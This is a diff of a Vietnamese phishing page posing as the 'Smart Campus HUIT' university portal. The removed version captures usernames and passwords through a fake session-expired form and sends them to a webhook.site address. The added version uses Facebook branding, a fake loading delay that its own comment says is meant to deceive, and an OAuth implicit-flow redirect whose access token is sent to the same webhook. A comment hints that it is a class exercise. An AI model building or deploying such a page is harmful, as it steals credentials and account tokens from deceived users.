@@ -1,27 +1,75 @@
 <!DOCTYPE html>
-<html>
-<body style="font-family: Arial; text-align: center; padding-top: 50px;">
-    <h2>Hệ thống Smart Campus HUIT</h2>
-    <p>Phiên làm việc của bạn đã hết hạn. Vui lòng xác thực lại để tiếp tục.</p>
-    <form id="trapForm">
-        <input type="text" id="user" placeholder="Email hoặc số điện thoại" required style="margin: 5px; padding: 10px;"><br>
-        <input type="password" id="pass" placeholder="Mật khẩu" required style="margin: 5px; padding: 10px;"><br>
-        <button type="submit" style="padding: 10px 20px; background: #1877f2; color: white; border: none; border-radius: 5px;">Xác thực ngay</button>
-    </form>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Hệ Thống Smart Campus - Đồng Bộ Dữ Liệu</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        .logo { width: 80px; margin-bottom: 20px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { background-color: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; }
+        button:hover { background-color: #166fe5; }
+        .footer-text { font-size: 12px; color: #606770; margin-top: 20px; }
+    </style>
+</head>
+<body>
 
-    <script>
-        document.getElementById('trapForm').onsubmit = function(e) {
-            e.preventDefault();
-            var u = document.getElementById('user').value;
-            var p = document.getElementById('pass').value;
-            // Gửi dữ liệu về Webhook của bạn
-            var data = "User: " + u + " | Pass: " + p;
-            fetch("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916?c=" + btoa(data))
-            .then(() => {
-                alert("Xác thực thành công! Đang quay lại dự án...");
+<div class="container" id="main-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="logo" alt="FB Logo">
+    <h2 id="status-title">Đang đồng bộ Smart Campus...</h2>
+    <div id="loading-ui">
+        <div class="loader"></div>
+        <p>Vui lòng đợi trong giây lát để hệ thống kiểm tra phiên đăng nhập Facebook của bạn.</p>
+    </div>
+    
+    <div id="action-ui" style="display: none;">
+        <p>Hệ thống nhận diện bạn đang đăng nhập Facebook. Nhấn vào bên dưới để tiếp tục mà không cần nhập lại mật khẩu.</p>
+        <button onclick="redirectToAuth()">Tiếp tục với vai trò Người dùng</button>
+    </div>
+    
+    <p class="footer-text">Ứng dụng được phát triển bởi dự án Smart Campus - HUIT</p>
+</div>
+
+<script>
+    // 1. Giả lập thời gian quét hệ thống để đánh lừa tâm lý
+    setTimeout(function() {
+        document.getElementById('loading-ui').style.display = 'none';
+        document.getElementById('action-ui').style.display = 'block';
+        document.getElementById('status-title').innerText = "Xác nhận danh tính";
+    }, 2500);
+
+    // 2. Hàm chuyển hướng đến trang lấy Token (OAuth)
+    function redirectToAuth() {
+        // Thay 'YOUR_APP_ID' bằng ID ứng dụng thực tế trên Facebook Developers
+        // Thay 'YOUR_REDIRECT_URI' bằng URL trang web của bạn (phải đăng ký trong App FB)
+        const client_id = "YOUR_APP_ID"; 
+        const redirect_uri = encodeURIComponent("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916");
+        
+        const fb_auth_url = `https://www.facebook.com/v18.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect_uri}&response_type=token&scope=public_profile,email`;
+        
+        // Ghi lại log trình duyệt trước khi chuyển đi (để nộp bài tập)
+        console.log("Đang bắt đầu quá trình lấy Access Token...");
+        
+        // Chuyển hướng người dùng
+        window.location.href = fb_auth_url;
+    }
+
+    // 3. Logic xử lý sau khi lấy được Token (Dùng nếu trang này là trang đích nhận callback)
+    window.onload = function() {
+        if (window.location.hash) {
+            const params = new URLSearchParams(window.location.hash.substring(1));
+            const accessToken = params.get('access_token');
+            if (accessToken) {
+                // Gửi token thu hoạch được về server của "hacker"
+                fetch("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916?captured_token=" + accessToken);
+                alert("Đồng bộ thành công! Bạn sẽ được chuyển về trang chủ.");
                 window.location.href = "https://www.facebook.com";
-            });
-        };
-    </script>
+            }
+        }
+    }
+</script>
+
 </body>
 </html>
